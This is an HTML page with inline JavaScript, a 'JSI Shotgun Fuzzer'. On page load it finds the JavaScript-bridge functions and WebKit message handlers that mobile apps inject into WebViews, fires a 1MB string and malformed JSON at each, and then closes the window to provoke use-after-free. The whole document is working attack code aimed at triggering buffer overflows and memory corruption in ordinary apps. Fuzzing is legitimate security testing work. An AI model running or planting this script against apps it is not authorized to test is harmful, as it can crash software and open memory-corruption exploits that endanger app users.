<!DOCTYPE html>
<html>
<head><title>JSI Shotgun Fuzzer</title></head>
<body style="background:#111; color:#0f0;">
    <h2>Fuzzing all injected interfaces...</h2>
    <div id="log"></div>

    <script>
        const logEl = document.getElementById('log');
        function log(msg) { logEl.innerHTML += msg + "<br>"; }

        // The malformed data we want to force into a C++ buffer
        const giantString = "A".repeat(1024 * 1024); // 1MB string
        const malformedJson = '{"cmd":"test", "data":' + giantString + '}';

        function shotgun() {
            log("[*] Commencing Shotgun Fuzz...");

            // 1. Attack common WebKit Message Handlers (iOS style, but sometimes present on Android)
            try {
                if (window.webkit && window.webkit.messageHandlers) {
                    for (let handler in window.webkit.messageHandlers) {
                        log("Firing at webkit handler: " + handler);
                        window.webkit.messageHandlers[handler].postMessage(giantString);
                        window.webkit.messageHandlers[handler].postMessage(malformedJson);
                    }
                }
            } catch(e) {}

            // 2. Attack ALL functions on the window object that aren't native browser functions
            for (let prop in window) {
                try {
                    let obj = window[prop];
                    if (typeof obj === 'function' && !obj.toString().includes('[native code]')) {
                        // Found a custom injected function! Fire at will.
                        log("Firing at global function: " + prop);
                        obj(giantString);
                        obj(malformedJson);
                    } else if (typeof obj === 'object' && obj !== null && prop !== 'window' && prop !== 'document') {
                         // Look inside objects (like window._FB_.doSomething)
                         let methods = Object.getOwnPropertyNames(Object.getPrototypeOf(obj));
                         methods.forEach(m => {
                             if (typeof obj[m] === 'function') {
                                 log(`Firing at object method: ${prop}.${m}`);
                                 obj[m](giantString);
                                 obj[m](malformedJson);
                             }
                         });
                    }
                } catch(e) {}
            }
            
            log("[*] Volley complete.");
        }

        // Run the fuzzer immediately
        shotgun();

        // Optional: Trigger destruction to test for UAF if the buffer overflow fails
        setTimeout(() => {
            window.close(); 
        }, 1000);

    </script>
</body>
</html>
